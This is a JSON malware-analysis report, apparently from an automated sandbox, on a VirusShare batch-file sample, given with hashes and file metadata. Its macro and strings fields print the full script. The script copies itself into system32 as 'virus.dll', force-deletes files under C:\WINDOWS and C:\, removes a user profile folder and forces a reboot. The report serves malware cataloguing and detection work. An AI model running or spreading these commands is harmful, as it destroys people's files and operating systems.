@@ -1,0 +1,52 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "WINDOWS": "May enumerate application windows"
+        },
+        "macro": "@echo off \ncls 'Starts cls mode \nif exist \"C:\\WINDOWS\" goto XP \nelse goto otherOS \n\n:XP \necho You have Windows XP I see\npause 'Waits for the user to press a key \ncopy %0 \"C:\\WINDOWS\\system32\\virus.dll\" \ndel /f /q \"C:\\WINDOWS\\*.*\"\nRD/s/q \"C:\\Documents and Settings\\User\"\nstart mspaint \nstart notepad \nSHUTDOWN -r -t 10\n\n:otherOS\necho Get with the program!\nCD \"C:\\\" \ndel /f /q \"*.*\" \nMD \"C:\\You Have Been Buggered!\"\nexit\n\n"
+    },
+    "filename": "VirusShare_21370514ca6d7131f602d4de47e19267",
+    "filesize": 444,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "21370514ca6d7131f602d4de47e19267",
+        "sha1": "6deeff6c06dd9164623cd07eea2021c14bf94b47",
+        "sha256": "58e5aeeb759549f67645c31aac8bc0b0294c1e61d9bd1cc045665e50ff2ddb07"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off ",
+            "cls 'Starts cls mode ",
+            "if exist \"C:\\WINDOWS\" goto XP ",
+            "else goto otherOS ",
+            ":XP ",
+            "echo You have Windows XP I see",
+            "pause 'Waits for the user to press a key ",
+            "copy %0 \"C:\\WINDOWS\\system32\\virus.dll\" ",
+            "del /f /q \"C:\\WINDOWS\\*.*\"",
+            "RD/s/q \"C:\\Documents and Settings\\User\"",
+            "start mspaint ",
+            "start notepad ",
+            "SHUTDOWN -r -t 10",
+            ":otherOS",
+            "echo Get with the program!",
+            "CD \"C:\\\" ",
+            "del /f /q \"*.*\" ",
+            "MD \"C:\\You Have Been Buggered!\"",
+            "exit"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.250911",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
